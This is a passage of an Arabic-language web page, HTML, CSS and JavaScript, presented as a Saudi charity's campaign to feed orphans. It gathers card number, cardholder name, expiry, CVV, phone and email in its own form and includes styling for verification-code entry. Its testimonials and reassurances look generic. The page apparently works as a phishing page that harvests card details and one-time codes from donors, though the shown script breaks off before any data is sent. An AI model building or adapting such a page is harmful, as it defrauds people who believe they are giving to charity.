            gap: 8px;
            margin-bottom: 25px;
            direction: ltr;
        }
        
        @media (min-width: 768px) {
            .code-inputs {
                gap: 10px;
                margin-bottom: 30px;
            }
        }
        
        .code-input {
            width: 45px;
            height: 55px;
            text-align: center;
            font-size: 22px;
            border: 1px solid #ddd;
            border-radius: var(--border-radius);
            direction: ltr;
            font-family: monospace;
            transition: var(--transition);
            caret-color: transparent;
            inputmode: numeric;
            -webkit-user-select: text;
            user-select: text;
        }
        
        @media (min-width: 768px) {
            .code-input {
                width: 50px;
                height: 60px;
                font-size: 24px;
            }
        }
        
        .code-input:focus {
            border-color: var(--accent-color);
            box-shadow: 0 0 0 3px rgba(44, 120, 108, 0.1);
            outline: none;
        }
        
        .resend-code {
            text-align: center;
            margin-top: 15px;
            color: var(--text-light);
            font-size: 14px;
        }
        
        @media (min-width: 768px) {
            .resend-code {
                margin-top: 20px;
                font-size: 15px;
            }
        }
        
        .resend-link {
            color: var(--primary-color);
            cursor: pointer;
            text-decoration: underline;
            font-weight: 600;
            transition: var(--transition);
        }
        
        .resend-link:hover {
            color: var(--secondary-color);
        }
        
        .timer {
            color: var(--error-color);
            font-weight: 600;
        }
        
        .progress-bar {
            height: 4px;
            background: #eee;
            border-radius: 3px;
            margin-bottom: 25px;
            overflow: hidden;
        }
        
        @media (min-width: 768px) {
            .progress-bar {
                height: 5px;
                margin-bottom: 30px;
            }
        }
        
        .progress {
            height: 100%;
            background: var(--gradient);
            width: 0%;
            transition: width 0.5s;
        }
        
        /* صفحة الشكر */
        .thank-you-page {
            text-align: center;
        }
        
        .thank-you-icon {
            font-size: 60px;
            color: var(--primary-color);
            margin: 15px 0;
            animation: bounce 1s;
        }
        
        @media (min-width: 768px) {
            .thank-you-icon {
                font-size: 70px;
                margin: 20px 0;
            }
        }
        
        @keyframes bounce {
            0%, 20%, 50%, 80%, 100% {transform: translateY(0);}
            40% {transform: translateY(-15px);}
            60% {transform: translateY(-8px);}
        }
        
        .thank-you-title {
            font-size: 24px;
            color: var(--primary-color);
            margin-bottom: 12px;
            font-weight: 700;
        }
        
        @media (min-width: 768px) {
            .thank-you-title {
                font-size: 26px;
                margin-bottom: 15px;
            }
        }
        
        .thank-you-message {
            color: var(--text-light);
            line-height: 1.6;
            margin-bottom: 20px;
            font-size: 15px;
        }
        
        @media (min-width: 768px) {
            .thank-you-message {
                line-height: 1.7;
                margin-bottom: 25px;
                font-size: 16px;
            }
        }
        
        .donation-details {
            background: var(--light-color);
            padding: 15px;
            border-radius: var(--border-radius);
            margin: 20px 0;
            text-align: right;
            box-shadow: 0 3px 6px rgba(0, 0, 0, 0.05);
        }
        
        @media (min-width: 768px) {
            .donation-details {
                padding: 18px;
                margin: 25px 0;
                box-shadow: 0 4px 8px rgba(0, 0, 0, 0.05);
            }
        }
        
        .donation-detail {
            display: flex;
            justify-content: space-between;
            margin-bottom: 10px;
        }
        
        .donation-detail:last-child {
            margin-bottom: 0;
        }
        
        .donation-label {
            color: var(--text-light);
            font-weight: 500;
            font-size: 14px;
        }
        
        @media (min-width: 768px) {
            .donation-label {
                font-size: 15px;
            }
        }
        
        .donation-value {
            color: var(--primary-color);
            font-weight: 600;
            font-size: 14px;
        }
        
        @media (min-width: 768px) {
            .donation-value {
                font-size: 15px;
            }
        }
        
        .social-share {
            display: flex;
            justify-content: center;
            gap: 12px;
            margin: 20px 0;
        }
        
        @media (min-width: 768px) {
            .social-share {
                gap: 15px;
                margin: 25px 0;
            }
        }
        
        .social-icon {
            width: 38px;
            height: 38px;
            border-radius: 50%;
            background: #f0f0f0;
            display: flex;
            align-items: center;
            justify-content: center;
            color: var(--primary-color);
            font-size: 16px;
            transition: var(--transition);
            cursor: pointer;
        }
        
        @media (min-width: 768px) {
            .social-icon {
                width: 40px;
                height: 40px;
                font-size: 18px;
            }
        }
        
        .social-icon:hover {
            background: var(--primary-color);
            color: white;
            transform: translateY(-3px);
        }
        
        /* أنماط جديدة للتحقق من البطاقة */
        .card-type-badge {
            background: rgba(255, 255, 255, 0.2);
            padding: 3px 6px;
            border-radius: 4px;
            font-size: 11px;
            margin-top: 5px;
            display: inline-block;
        }
        
        @media (min-width: 768px) {
            .card-type-badge {
                padding: 3px 8px;
                font-size: 12px;
            }
        }
        
        .valid-card {
            border: 2px solid var(--success-color) !important;
            box-shadow: 0 0 8px rgba(64, 192, 87, 0.3);
        }
        
        .invalid-card {
            border: 2px solid var(--error-color) !important;
            box-shadow: 0 0 8px rgba(255, 107, 107, 0.3);
        }
        
        .card-type-info {
            font-size: 11px;
            color: rgba(255, 255, 255, 0.8);
            margin-top: 5px;
        }
        
        @media (min-width: 768px) {
            .card-type-info {
                font-size: 12px;
            }
        }
        
        /* شهادة التبرع */
        .certificate {
            background: white;
            border: 2px solid var(--primary-color);
            border-radius: var(--border-radius);
            padding: 20px;
            margin: 20px 0;
            text-align: center;
            position: relative;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100" fill="none" stroke="%232c786c" stroke-width="0.5" opacity="0.05"><path d="M0,0 L100,100 M100,0 L0,100"></path></svg>');
        }
        
        @media (min-width: 768px) {
            .certificate {
                padding: 25px;
                margin: 25px 0;
                box-shadow: 0 8px 15px rgba(0, 0, 0, 0.1);
            }
        }
        
        .certificate::before {
            content: '';
            position: absolute;
            top: 8px;
            right: 8px;
            bottom: 8px;
            left: 8px;
            border: 1px dashed var(--primary-color);
            border-radius: 5px;
            pointer-events: none;
        }
        
        @media (min-width: 768px) {
            .certificate::before {
                top: 10px;
                right: 10px;
                bottom: 10px;
                left: 10px;
            }
        }
        
        .certificate-title {
            font-size: 22px;
            color: var(--primary-color);
            margin-bottom: 12px;
            font-weight: 800;
            position: relative;
            display: inline-block;
        }
        
        @media (min-width: 768px) {
            .certificate-title {
                font-size: 24px;
                margin-bottom: 15px;
            }
        }
        
        .certificate-title::after {
            content: '';
            position: absolute;
            bottom: -6px;
            right: 0;
            width: 50px;
            height: 3px;
            background: var(--accent-color);
            border-radius: 2px;
        }
        
        @media (min-width: 768px) {
            .certificate-title::after {
                bottom: -8px;
                width: 60px;
                height: 4px;
            }
        }
        
        .certificate-text {
            color: var(--text-light);
            line-height: 1.7;
            margin-bottom: 12px;
            font-size: 15px;
        }
        
        @media (min-width: 768px) {
            .certificate-text {
                line-height: 1.8;
                margin-bottom: 15px;
                font-size: 16px;
            }
        }
        
        .certificate-seal {
            width: 70px;
            height: 70px;
            background: var(--primary-color);
            border-radius: 50%;
            margin: 12px auto;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 28px;
            box-shadow: 0 3px 6px rgba(0, 0, 0, 0.1);
        }
        
        @media (min-width: 768px) {
            .certificate-seal {
                width: 80px;
                height: 80px;
                margin: 15px auto;
                font-size: 30px;
                box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            }
        }
        
        .certificate-details {
            margin-top: 15px;
            text-align: right;
            border-top: 1px dashed #ddd;
            padding-top: 12px;
        }
        
        @media (min-width: 768px) {
            .certificate-details {
                margin-top: 20px;
                padding-top: 15px;
            }
        }
        
        .certificate-detail {
            display: flex;
            justify-content: space-between;
            margin-bottom: 6px;
        }
        
        @media (min-width: 768px) {
            .certificate-detail {
                margin-bottom: 8px;
            }
        }
        
        .certificate-label {
            color: var(--text-light);
            font-weight: 500;
            font-size: 14px;
        }
        
        @media (min-width: 768px) {
            .certificate-label {
                font-size: 15px;
            }
        }
        
        .certificate-value {
            color: var(--primary-color);
            font-weight: 600;
            font-size: 14px;
        }
        
        @media (min-width: 768px) {
            .certificate-value {
                font-size: 15px;
            }
        }
        
        /* تحسينات لحقل CVV */
        .cvv-container {
            position: relative;
        }
        
        .cvv-info {
            position: absolute;
            left: 10px;
            top: 50%;
            transform: translateY(-50%);
            color: var(--text-light);
            cursor: help;
            font-size: 15px;
        }
        
        .cvv-input {
            padding-left: 35px !important;
        }
        
        /* تحسينات لحقل الهاتف */
        .phone-prefix {
            display: flex;
            align-items: center;
            background: #f0f0f0;
            padding: 12px 8px;
            border-radius: var(--border-radius) 0 0 var(--border-radius);
            border: 1px solid #ddd;
            border-left: none;
            font-size: 13px;
            gap: 5px;
        }
        
        @media (min-width: 768px) {
            .phone-prefix {
                padding: 14px 10px;
                font-size: 14px;
            }
        }
        
        /* زر ثانوي */
        .btn-secondary {
            background: white;
            color: var(--primary-color);
            border: 2px solid var(--primary-color);
            margin-bottom: 15px;
        }
        
        .btn-secondary:hover {
            background: var(--primary-color);
            color: white;
        }
        
        /* تحسينات للجوال */
        @media (max-width: 480px) {
            .payment-methods {
                grid-template-columns: 1fr;
            }
            
            .amount-options {
                grid-template-columns: 1fr 1fr;
            }
            
            .code-input {
                width: 40px;
                height: 50px;
                font-size: 20px;
            }
            
            .card-preview {
                height: 160px;
                padding: 12px;
            }
            
            .card-number {
                font-size: 16px;
                margin: 10px 0;
            }
            
            /* تحسينات للهاتف - حقول الإدخال */
            .form-group input, .form-group textarea, .form-group select {
                padding: 10px 12px;
                font-size: 14px;
            }
            
            /* تحسينات للهاتف - أزرار */
            .btn {
                padding: 14px;
                font-size: 15px;
            }
            
            /* تحسينات للهاتف - شريط التقدم */
            .progress-bar {
                margin-bottom: 15px;
            }
            
            /* تحسينات للهاتف - شهادة التبرع */
            .certificate {
                padding: 15px;
                margin: 15px 0;
            }
            
            .certificate-title {
                font-size: 20px;
            }
            
            .certificate-text {
                font-size: 14px;
            }
            
            /* تحسينات للهاتف - شريط التقدم */
            .progress-bar {
                height: 3px;
            }
            
            /* تحسينات للهاتف - زر الرجوع */
            .back-btn {
                font-size: 14px;
                padding: 5px 8px;
                margin-bottom: 10px;
            }
            
            /* تحسينات للهاتف - حجم الخط */
            .header h1 {
                font-size: 20px;
            }
            
            .header p {
                font-size: 13px;
            }
            
            .campaign-title {
                font-size: 22px;
            }
            
            .campaign-description {
                font-size: 14px;
            }
            
            /* تحسينات للهاتف - حجم الأيقونات */
            .payment-icon {
                width: 45px;
                height: 30px;
            }
            
            /* تحسينات للهاتف - حجم شريط التقدم */
            .progress-bar {
                height: 3px;
            }
            
            /* تحسينات للهاتف - حجم حقول رمز التحقق */
            .code-input {
                width: 35px;
                height: 45px;
                font-size: 18px;
            }
        }
        
        /* تحسينات التنبيهات والرسائل */
        .alert {
            padding: 12px 16px;
            border-radius: var(--border-radius);
            margin-bottom: 15px;
            font-size: 14px;
            display: flex;
            align-items: center;
        }
        
        .alert i {
            margin-left: 8px;
            font-size: 18px;
        }
        
        .alert-error {
            background-color: rgba(255, 107, 107, 0.1);
            border-left: 4px solid var(--error-color);
            color: var(--error-color);
        }
        
        .alert-success {
            background-color: rgba(64, 192, 87, 0.1);
            border-left: 4px solid var(--success-color);
            color: var(--success-color);
        }
        
        .alert-warning {
            background-color: rgba(252, 196, 25, 0.1);
            border-left: 4px solid var(--warning-color);
            color: var(--warning-color);
        }
        
        .alert-info {
            background-color: rgba(51, 154, 240, 0.1);
            border-left: 4px solid var(--info-color);
            color: var(--info-color);
        }
        
        /* تحسينات لحقول الإدخال غير الصالحة */
        .invalid-field {
            border-color: var(--error-color) !important;
            background-color: rgba(255, 107, 107, 0.05) !important;
        }
        
        /* تحسينات لحقول الإدخال الصالحة */
        .valid-field {
            border-color: var(--success-color) !important;
            background-color: rgba(64, 192, 87, 0.05) !important;
        }
        
        /* تحسينات للرسائل العائمة */
        .floating-message {
            position: fixed;
            top: 20px;
            right: 20px;
            padding: 12px 16px;
            border-radius: var(--border-radius);
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
            z-index: 1000;
            display: flex;
            align-items: center;
            transform: translateX(150%);
            transition: transform 0.5s ease-in-out;
        }
        
        .floating-message.show {
            transform: translateX(0);
        }
        
        .floating-message i {
            margin-left: 8px;
        }
        
        .floating-message.success {
            background-color: white;
            color: var(--success-color);
            border-left: 4px solid var(--success-color);
        }
        
        .floating-message.error {
            background-color: white;
            color: var(--error-color);
            border-left: 4px solid var(--error-color);
        }
        
        /* تحسينات للعناصر المطلوبة */
        .required-field {
            position: relative;
        }
        
        .required-field::after {
            content: '*';
            color: var(--error-color);
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 16px;
        }
    </style>
</head>
<body>
    <!-- شاشة التحميل -->
    <div class="loading-overlay">
        <div class="loader"></div>
        <div class="loading-text">جاري معالجة طلبك...</div>
    </div>
    
    <!-- رسائل عائمة -->
    <div id="floatingMessage" class="floating-message" style="display: none;">
        <i class="fas fa-check-circle"></i>
        <span id="floatingMessageText"></span>
    </div>
    
    <div class="container card-shadow">
        <!-- صفحة البداية -->
        <div id="welcomePage" class="welcome-page page-transition">
            <div class="header">
                <div class="logo">
                    <div class="logo-icon">
                        <i class="fas fa-hands-helping"></i>
                    </div>
                    <div class="logo-text">جمعية البر الخيرية</div>
                </div>
                <h1>حملة إطعام طفل يتيم</h1>
                <p>ساهم في إطعام طفل يتيم لمدة شهر</p>
            </div>
            
            <div class="content">
                <div class="campaign-slider">
                    <div class="slide slide-1 active">
                        <div class="slide-content">
                            <p>ساعد في توفير وجبات غذائية للأيتام</p>
                        </div>
                    </div>
                    <div class="slide slide-2">
                        <div class="slide-content">
                            <p>كل ريال يساهم في إطعام طفل يتيم</p>
                        </div>
                    </div>
                    <div class="slide slide-3">
                        <div class="slide-content">
                            <p>تبرعك يوفر وجبات غذائية للأطفال الأيتام</p>
                        </div>
                    </div>
                </div>
                
                <h2 class="campaign-title">إطعام طفل يتيم</h2>
                
                <p class="campaign-description">
                    في كل يوم، يعاني آلاف الأطفال الأيتام من الجوع ونقص التغذية. 
                    تبرعك اليوم يمكن أن يوفر وجبات غذائية لطفل يتيم لمدة شهر كامل. 
                    نحن نضمن وصول تبرعك مباشرة إلى الأطفال المحتاجين بشفافية كاملة من خلال تقارير شهرية مفصلة.
                </p>
                
                <div class="stats">
                    <div class="stat-item">
                        <div class="stat-number">10,000+</div>
                        <div class="stat-label">طفل يتيم تم إطعامهم</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-number">100%</div>
                        <div class="stat-label">معدل الشفافية</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-number">12</div>
                        <div class="stat-label">مدينة في المملكة</div>
                    </div>
                </div>
                
                <div class="impact-statement">
                    "كل ريال تتبرع به يساهم في إطعام طفل يتيم لمدة يوم كامل"
                </div>
                
                <div class="info-box">
                    <div class="info-box-title">
                        <i class="fas fa-shield-alt"></i>
                        تبرعك آمن ومضمون
                    </div>
                    <div class="info-box-content">
                        نستخدم أحدث أنظمة الحماية والتشفير لتأمين بياناتك ومدفوعاتك. جميع التبرعات محمية بنظام تأمين متكامل.
                    </div>
                </div>
                
                <div class="testimonials">
                    <div class="testimonial">
                        لقد تابعت أعمال هذه الجمعية منذ سنوات وأشهد بوصول تبرعاتي لمستحقيها. تقاريرهم الشهرية توضح بالتفصيل أين تذهب كل ريال.
                        <div class="testimonial-author">د. أحمد الغامدي</div>
                    </div>
                    
                    <div class="testimonial">
                        تبرعت العام الماضي وسعدت برؤية تأثير تبرعي من خلال الصور والتقارير التي وصلتني. جمعية جديرة بالثقة.
                        <div class="testimonial-author">فاطمة العتيبي</div>
                    </div>
                </div>
                
                <button id="startDonationBtn" class="btn btn-touch glow-effect">
                    تبرع الآن وساهم في إطعام طفل يتيم
                    <i class="fas fa-heart"></i>
                </button>
                
                <div class="footer">
                    <div>جمعية البر الخيرية - ترخيص رقم 46801</div>
                    <div class="footer-links">
                        <a href="#" class="footer-link">الشروط والأحكام</a>
                        <a href="#" class="footer-link">سياسة الخصوصية</a>
                        <a href="#" class="footer-link">اتصل بنا</a>
                    </div>
                </div>
            </div>
        </div>
        
        <!-- صفحة اختيار طريقة الدفع -->
        <div id="paymentMethodPage" class="payment-method-page page-transition" style="display: none;">
            <div class="header">
                <h1>اختر طريقة الدفع</h1>
                <p>اختر طريقة الدفع المفضلة لديك</p>
            </div>
            
            <div class="content">
                <div class="progress-bar">
                    <div class="progress" id="donationProgress" style="width: 20%;"></div>
                </div>
                
                <button type="button" class="back-btn" id="backToWelcomeBtn">
                    <i class="fas fa-arrow-left"></i> رجوع
                </button>
                
                <div class="payment-methods">
                    <div class="payment-method selected" data-method="visa">
                        <div class="badge">موصى به</div>
                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png" alt="Visa" class="payment-icon">
                        <div>فيزا</div>
                    </div>
                    <div class="payment-method" data-method="mastercard">
                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1280px-Mastercard-logo.svg.png" alt="Mastercard" class="payment-icon">
                        <div>ماستركارد</div>
                    </div>
                    <div class="payment-method" data-method="applepay">
                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b0/Apple_Pay_logo.svg/1200px-Apple_Pay_logo.svg.png" alt="Apple Pay" class="payment-icon">
                        <div>أبل باي</div>
                    </div>
                </div>
                
                <div class="info-box">
                    <div class="info-box-title">
                        <i class="fas fa-lock"></i>
                        دفع آمن ومشفّر
                    </div>
                    <div class="info-box-content">
                        جميع عمليات الدفع محمية بتقنيات التشفير المتقدمة. لن نقوم بتخزين أي بيانات بطاقة ائتمان على خوادمنا.
                    </div>
                </div>
                
                <button id="proceedToAmountBtn" class="btn btn-touch glow-effect">
                    التالي إلى اختيار المبلغ
                    <i class="fas fa-arrow-left"></i>
                </button>
            </div>
        </div>
        
        <!-- صفحة اختيار المبلغ -->
        <div id="donationAmountPage" class="donation-amount-page page-transition" style="display: none;">
            <div class="header">
                <h1>اختر مبلغ التبرع</h1>
                <p>اختر المبلغ الذي ترغب في التبرع به</p>
            </div>
            
            <div class="content">
                <div class="progress-bar">
                    <div class="progress" id="donationProgress" style="width: 40%;"></div>
                </div>
                
                <button type="button" class="back-btn" id="backToMethodBtn">
                    <i class="fas fa-arrow-left"></i> رجوع
                </button>
                
                <div class="amount-options">
                    <div class="amount-option" data-amount="50">50 ر.س</div>
                    <div class="amount-option" data-amount="100">100 ر.س</div>
                    <div class="amount-option" data-amount="200">200 ر.س</div>
                    <div class="amount-option" data-amount="300">300 ر.س</div>
                    <div class="amount-option" data-amount="500">500 ر.س</div>
                    <div class="amount-option" data-amount="1000">1000 ر.س</div>
                </div>
                
                <div class="custom-amount">
                    <div class="form-group required">
                        <label>أو اكتب المبلغ المطلوب</label>
                        <input type="number" id="customAmount" class="number-input" placeholder="المبلغ بالريال السعودي" min="1">
                        <div class="error-message" id="amountError">يجب إدخال مبلغ صحيح (أقل مبلغ 10 ر.س)</div>
                    </div>
                </div>
                
                <div class="form-group">
                    <label>ملاحظات (اختياري)</label>
                    <textarea id="donationNote" placeholder="أضف ملاحظاتك هنا... (مثال: تخصيص التبرع لبرنامج معين)"></textarea>
                </div>
                
                <div class="info-box">
                    <div class="info-box-title">
                        <i class="fas fa-hand-holding-heart"></i>
                        تأثير تبرعك
                    </div>
                    <div class="info-box-content">
                        <ul style="padding-right: 20px;">
                            <li>50 ر.س توفر وجبات غذائية لطفل لمدة أسبوع</li>
                            <li>100 ر.س توفر لوازم مدرسية لطفل لمدة شهر</li>
                            <li>500 ر.س تساهم في علاج طفل من سوء التغذية</li>
                        </ul>
                    </div>
                </div>
                
                <button id="proceedToPaymentBtn" class="btn btn-touch glow-effect">
                    التالي إلى الدفع
                    <i class="fas fa-arrow-left"></i>
                </button>
            </div>
        </div>
        
        <!-- صفحة الدفع -->
        <div id="paymentPage" class="page-transition" style="display: none;">
            <div class="header">
                <h1>الدفع الإلكتروني</h1>
                <p>أدخل بيانات بطاقتك</p>
            </div>
            
            <div class="content">
                <div class="progress-bar">
                    <div class="progress" id="donationProgress" style="width: 60%;"></div>
                </div>
                
                <!-- نموذج الدفع -->
                <form id="paymentForm" class="payment-form">
                    <button type="button" class="back-btn" id="backToAmountBtn">
                        <i class="fas fa-arrow-left"></i> رجوع
                    </button>
                    
                    <div class="alert alert-info">
                        <i class="fas fa-info-circle"></i>
                        جميع البيانات محمية بتقنيات التشفير المتقدمة
                    </div>
                    
                    <div class="card-preview visa" id="cardPreview">
                        <div class="card-number" id="cardNumberPreview">•••• •••• •••• ••••</div>
                        <div class="card-details">
                            <div>
                                <div id="cardNamePreview">اسم حامل البطاقة</div>
                                <div class="card-type-info" id="cardTypePreview">فيزا</div>
                            </div>
                            <div id="cardExpiryPreview">MM/YY</div>
                        </div>
                    </div>
                    
                    <div class="form-group required">
                        <label>اسم حامل البطاقة (إنجليزي فقط)</label>
                        <input type="text" id="cardName" name="card_name" placeholder="Cardholder Name" pattern="[A-Za-z\s]+" title="يجب إدخال الاسم باللغة الإنجليزية">
                        <i class="fas fa-exclamation-triangle error-icon" id="nameErrorIcon"></i>
                        <div class="error-message" id="nameError">يجب إدخال اسم حامل البطاقة باللغة الإنجليزية (3 أحرف على الأقل)</div>
                    </div>
                    
                    <div class="form-group required">
                        <label>رقم البطاقة</label>
                        <input type="text" id="cardNumber" name="card_number" class="number-input" placeholder="•••• •••• •••• ••••" maxlength="19" inputmode="numeric">
                        <i class="fas fa-exclamation-triangle error-icon" id="numberErrorIcon"></i>
                        <div class="error-message" id="numberError">يجب إدخال رقم بطاقة صحيح (16 رقم)</div>
                    </div>
                    
                    <div class="form-group">
                        <label>رقم الهاتف (اختياري)</label>
                        <div style="display: flex; align-items: center;">
                            <div class="phone-prefix">
                                +966 🇸🇦
                            </div>
                            <input type="tel" id="phoneNumber" name="phone_number" class="number-input" placeholder="5XXXXXXXXX" maxlength="10" inputmode="numeric" style="border-radius: 0 var(--border-radius) var(--border-radius) 0; border-right: none;">
                        </div>
                        <i class="fas fa-exclamation-triangle error-icon" id="phoneErrorIcon"></i>
                        <div class="error-message" id="phoneError">يجب إدخال رقم هاتف سعودي صحيح (يبدأ بـ 5 ويتكون من 10 أرقام)</div>
                    </div>
                    
                    <div style="display: flex; gap: 10px;">
                        <div class="form-group required" style="flex: 1;">
                            <label>تاريخ الانتهاء</label>
                            <input type="text" id="cardExpiry" name="card_expiry" class="number-input" placeholder="MM/YY" maxlength="5" inputmode="numeric">
                            <i class="fas fa-exclamation-triangle error-icon" id="expiryErrorIcon"></i>
                            <div class="error-message" id="expiryError">تاريخ غير صحيح أو منتهي الصلاحية</div>
                        </div>
                        
                        <div class="form-group required" style="flex: 1;">
                            <label>CVV</label>
                            <div class="cvv-container">
                                <input type="password" id="cardCvv" name="card_cvv" class="number-input cvv-input" placeholder="•••" maxlength="3" inputmode="numeric">
                                <i class="fas fa-question-circle cvv-info" title="الرمز المكون من 3 أرقام الموجود على ظهر البطاقة"></i>
                                <i class="fas fa-exclamation-triangle error-icon" id="cvvErrorIcon"></i>
                            </div>
                            <div class="error-message" id="cvvError">يجب إدخال رمز CVV المكون من 3 أرقام</div>
                        </div>
                    </div>
                    
                    <div class="form-group">
                        <label>البريد الإلكتروني (اختياري)</label>
                        <input type="email" id="email" name="email" placeholder="example@domain.com">
                        <i class="fas fa-exclamation-triangle error-icon" id="emailErrorIcon"></i>
                        <div class="error-message" id="emailError">يجب إدخال بريد إلكتروني صحيح</div>
                    </div>
                    
                    <div class="info-box">
                        <div class="info-box-title">
                            <i class="fas fa-receipt"></i>
                            إيصال التبرع
                        </div>
                        <div class="info-box-content">
                            سيتم إرسال إيصال التبرع إلى بريدك الإلكتروني مع تفاصيل التبرع وأثر تبرعك.
                        </div>
                    </div>
                    
                    <div class="form-group" style="margin-top: 15px;">
                        <label style="display: flex; align-items: center; cursor: pointer;">
                            <input type="checkbox" id="subscribeNewsletter" name="subscribe_newsletter" style="margin-left: 8px;" checked>
                            أرغب في تلقي آخر أخبار الحملة والتحديثات
                        </label>
                    </div>
                    
                    <input type="hidden" id="donationAmount" name="donation_amount">
                    <input type="hidden" id="paymentMethod" name="payment_method" value="visa">
                    <input type="hidden" id="donationNoteHidden" name="donation_note">
                    
                    <button type="submit" class="btn btn-touch glow-effect" id="submitPaymentBtn">تأكيد الدفع</button>
                </form>
            </div>
        </div>
        
        <!-- صفحة الشكر -->
        <div id="thankYouPage" class="thank-you-page page-transition" style="display: none;">
            <div class="header">
                <h1>شكراً لتبرعك!</h1>
                <p id="thankYouAmount"></p>
            </div>
            
            <div class="content">
                <div class="thank-you-icon">
                    <i class="fas fa-heart"></i>
                </div>
                
                <h2 class="thank-you-title">تبرعك سيحدث فرقاً</h2>
                
                <p class="thank-you-message">
                    لقد تم استلام تبرعك بنجاح. ستصلك رسالة تأكيد على بريدك الإلكتروني ورقم هاتفك مع تفاصيل التبرع وإيصال رسمي.
                </p>
                
                <div class="donation-details">
                    <div class="donation-detail">
                        <span class="donation-label">رقم المرجع:</span>
                        <span class="donation-value" id="donationReference">DON-2023-456789</span>
                    </div>
                    <div class="donation-detail">
                        <span class="donation-label">تاريخ التبرع:</span>
                        <span class="donation-value" id="donationDate">29 يوليو 2023 - 10:30 ص</span>
                    </div>
                    <div class="donation-detail">
                        <span class="donation-label">طريقة الدفع:</span>
                        <span class="donation-value" id="donationMethod">فيزا</span>
                    </div>
                </div>
                
                <div class="certificate">
                    <div class="certificate-title">شهادة تقدير</div>
                    <div class="certificate-text">
                        نشكرك على كرمك وتبرعك السخي الذي سيساهم في تغيير حياة الأطفال الأيتام. تبرعك هو شهادة على إنسانيتك واهتمامك ببناء مستقبل أفضل للأطفال المحتاجين.
                    </div>
                    <div class="certificate-seal">
                        <i class="fas fa-certificate"></i>
                    </div>
                    <div class="certificate-details">
                        <div class="certificate-detail">
                            <span class="certificate-label">مبلغ التبرع:</span>
                            <span class="certificate-value" id="certificateAmount">500 ر.س</span>
                        </div>
                        <div class="certificate-detail">
                            <span class="certificate-label">رقم الهاتف:</span>
                            <span class="certificate-value" id="certificatePhone">+966 50 123 4567</span>
                        </div>
                        <div class="certificate-detail">
                            <span class="certificate-label">البلد:</span>
                            <span class="certificate-value">المملكة العربية السعودية</span>
                        </div>
                        <div class="certificate-detail">
                            <span class="certificate-label">رقم الترخيص:</span>
                            <span class="certificate-value">46801</span>
                        </div>
                    </div>
                </div>
                
                <div class="social-share">
                    <div class="social-icon" onclick="shareOnSocial('facebook')">
                        <i class="fab fa-facebook-f"></i>
                    </div>
                    <div class="social-icon" onclick="shareOnSocial('twitter')">
                        <i class="fab fa-twitter"></i>
                    </div>
                    <div class="social-icon" onclick="shareOnSocial('whatsapp')">
                        <i class="fab fa-whatsapp"></i>
                    </div>
                </div>
                
                <button class="btn btn-secondary" id="downloadCertificateBtn">
                    <i class="fas fa-download"></i> تحميل شهادة التبرع
                </button>
                
                <button class="btn btn-touch glow-effect" id="backToHomeBtn">
                    العودة إلى الصفحة الرئيسية
                </button>
                
                <div class="footer">
                    <div>جمعية البر الخيرية - ترخيص رقم 46801</div>
                    <div class="footer-links">
                        <a href="#" class="footer-link">الشروط والأحكام</a>
                        <a href="#" class="footer-link">سياسة الخصوصية</a>
                        <a href="#" class="footer-link">اتصل بنا</a>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        // تهيئة الصفحة
        document.addEventListener('DOMContentLoaded', function() {
            initEventListeners();
            initSlider();
            
            // إظهار صفحة البداية فقط
            document.getElementById('welcomePage').style.display = 'block';
            document.getElementById('paymentMethodPage').style.display = 'none';
            document.getElementById('donationAmountPage').style.display = 'none';
            document.getElementById('paymentPage').style.display = 'none';
            document.getElementById('thankYouPage').style.display = 'none';
            
            // تعطيل زر التأكيد في البداية
            document.getElementById('submitPaymentBtn').disabled = true;
            
            // تعيين تاريخ التبرع
            const now = new Date();
            const options = { year: 'numeric', month: 'long', day: 'numeric', hour: '2-digit', minute: '2-digit' };
            document.getElementById('donationDate').textContent = now.toLocaleDateString('ar-SA', options);
            
            // إنشاء رقم مرجع عشوائي
            document.getElementById('donationReference').textContent = 'DON-' + now.getFullYear() + '-' + Math.floor(100000 + Math.random() * 900000);
        });

        // سلايدر الصور في الصفحة الرئيسية
        function initSlider() {
            const slides = document.querySelectorAll('.slide');
            let currentSlide = 0;
            
            function nextSlide() {
                slides[currentSlide].classList.remove('active');
                currentSlide = (currentSlide + 1) % slides.length;
                slides[currentSlide].classList.add('active');
            }
            
            setInterval(nextSlide, 5000);
        }

        // ========== دوال التحقق من البطاقة ==========
        
        // خوارزمية لون للتحقق من صحة رقم البطاقة
        function isValidLuhn(cardNumber) {
            const cleaned = cardNumber.replace(/\s+/g, '').replace(/\D/g, '');
            if (cleaned.length !== 16) return false;
            
            let sum = 0;
            for (let i = 0; i < cleaned.length; i++) {
                let digit = parseInt(cleaned[i]);
                if ((cleaned.length - i) % 2 === 0) {
                    digit *= 2;
                    if (digit > 9) digit -= 9;
                }
                sum += digit;
            }
            
            return sum % 10 === 0;
        }
        
        // تحديد نوع البطاقة
        function detectCardType(cardNumber) {
            const cleaned = cardNumber.replace(/\s+/g, '').replace(/\D/g, '');
            
            if (/^4/.test(cleaned)) return { type: 'visa', name: 'فيزا', valid: true };
            if (/^5[1-5]/.test(cleaned)) return { type: 'mastercard', name: 'ماستركارد', valid: true };
            if (/^2/.test(cleaned)) return { type: 'mastercard', name: 'ماستركارد', valid: true }; // بعض بطاقات Mastercard تبدأ بـ 2
            if (/^3[47]/.test(cleaned)) return { type: 'amex', name: 'أمريكان إكسبريس', valid: true };
            if (/^6(?:011|5)/.test(cleaned)) return { type: 'discover', name: 'ديسكفر', valid: true };
            
            return { type: 'unknown', name: 'غير معروف', valid: false };
        }
        
        // التحقق من رقم الهاتف السعودي (10 أرقام بدلاً من 9)
        function validateSaudiPhoneNumber(phone) {
            if (!phone) return true; // اختياري
            if (phone.length !== 10) return false;
            
